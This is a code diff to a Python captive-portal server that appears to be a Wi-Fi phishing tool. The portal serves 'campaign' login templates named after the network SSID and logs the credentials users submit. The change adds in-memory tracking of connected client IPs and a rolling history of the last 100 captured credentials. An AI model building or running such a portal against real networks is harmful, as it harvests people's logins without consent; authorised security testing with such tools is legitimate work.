@@ -142,6 +142,11 @@ class _Handler(BaseHTTPRequestHandler):
     def do_GET(self) -> None:  # noqa: N802
         # Anything except an obvious asset gets the portal page.
         campaign = self.portal.campaign
+        
+        # Track connection
+        with self.portal._csv_lock:
+            self.portal.history_clients.add(self.client_address[0])
+
         tpl = TEMPLATES.get(campaign, TEMPLATES["generic"])
         # Perform {ssid} substitution on all template fields
         fmt_tpl = {k: (v.format(ssid=self.portal.ssid) if isinstance(v, str) else v) 
@@ -173,6 +178,10 @@ class CaptivePortal:
         self.campaign = campaign
         self.creds_captured = 0
         self.last_creds: dict[str, str] = {}
+        
+        self.history_creds: list[dict] = []
+        self.history_clients: set[str] = set()
+        
         self._csv_path: Optional[Path] = None
         self._csv_lock = threading.Lock()
         self._server: Optional[ThreadingHTTPServer] = None
@@ -226,6 +235,16 @@ class CaptivePortal:
         with self._csv_lock:
             self.creds_captured += 1
             self.last_creds = flat
+            
+            # Add to memory history
+            self.history_creds.append({
+                "ts": ts,
+                "ip": client_ip,
+                "creds": flat
+            })
+            if len(self.history_creds) > 100:
+                self.history_creds.pop(0)
+
             if self._csv_path:
                 try:
                     with self._csv_path.open("a", newline="") as f:
